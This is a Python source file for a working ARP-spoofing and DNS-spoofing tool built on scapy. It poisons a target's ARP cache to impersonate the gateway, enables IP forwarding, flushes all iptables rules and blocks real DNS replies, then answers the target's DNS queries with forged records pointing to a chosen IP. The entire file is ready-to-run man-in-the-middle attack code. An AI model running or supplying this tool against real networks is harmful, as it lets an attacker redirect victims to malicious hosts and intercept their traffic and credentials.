import os
import subprocess
import sys
from scapy.all import sniff, send
from scapy.layers.inet import UDP, IP
from typing import Tuple
import argparse
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.l2 import Ether, ARP
from scapy.sendrecv import srp
from threading import Thread, Lock
from time import sleep
import signal

stop_flag = False

lock = Lock()

def process_args() -> Tuple[str, str, str]:
    parser = argparse.ArgumentParser()
    parser.add_argument('target', help='Specify target address')
    parser.add_argument('spoof_ip', help='Specify spoofed address')
    parser.add_argument('gateway', help='Specify gateway IP')
    args = parser.parse_args()
    return args.target, args.spoof_ip, args.gateway


def spoof_packets(packet, spoof_ip: str) -> None:
    print(f"Intercepted packet: {packet[DNS].qd.qname}")
    ip = IP(dst=packet[IP].src, src=packet[IP].dst)
    udp = UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)
    rr = DNSRR(rrname=packet[DNS].qd.qname, ttl=3800, rdata=spoof_ip)
    dns = DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa=1, qr=1, an=rr)
    pkt = ip / udp / dns
    try:
        send(pkt, verbose=0)
    except (OSError, PermissionError) as e:
        print(f"{e}")
        sys.exit()


def sniff_init(target: str, spoof_ip: str) -> None:
    try:
        sniff(filter="udp dst port 53", prn=lambda p: spoof_packets(p, spoof_ip), store=False)
    except PermissionError:
        sys.exit("Permission error! Run as sudo or admin!")


def get_mac_address(target) -> str:
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=target)
    response = srp(pkt, timeout=1, verbose=False)[0]
    try:
        mac_addr = response[0][1].hwsrc
    except IndexError as e:
        sys.exit(f"Error when extracting MAC address. Check target IP")
    print(f"Got mac address {mac_addr}")
    return mac_addr


def configure_system(target: str) -> None:
    subprocess.run("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
    print("Enabled forwarding")
    os.system("iptables -F")
    os.system("iptables -A FORWARD -p udp --dport 53 -j DROP")
    os.system("iptables -A FORWARD -p tcp --dport 53 -j DROP")
    print("Blocking real DNS responses from gateway!")


def arp_init(target_mac: str, target_ip: str, gateway: str) -> None:
    t = Thread(target=arp_spoof, args=(target_mac, target_ip, gateway))
    t.start()


def arp_spoof(target_mac: str, target_ip: str, gateway: str) -> None:
    while True:
        pkt = ARP(op=2, pdst=target_ip, psrc=gateway, hwdst=target_mac)
        send(pkt, verbose=False)
        sleep(2)
        with lock:
            if stop_flag:
                sys.exit(0)


def sig_handler(signum, frame):
    global stop_flag
    stop_flag = True
    print(".... Exiting")
    sys.exit(0)


def check_perms():
    if os.geteuid() != 0:
        print("Error: Root privileges required!")
        sys.exit(1)


def main() -> None:
    target_ip, spoof_ip, gateway = process_args()
    check_perms()
    signal.signal (signal.SIGINT, sig_handler)
    signal.signal (signal.SIGTERM, sig_handler)
    configure_system(target_ip)
    target_mac = get_mac_address(target_ip)
    arp_init(target_mac, target_ip, gateway)
    sniff_init(target_ip, spoof_ip)


if __name__ == "__main__":
    main()
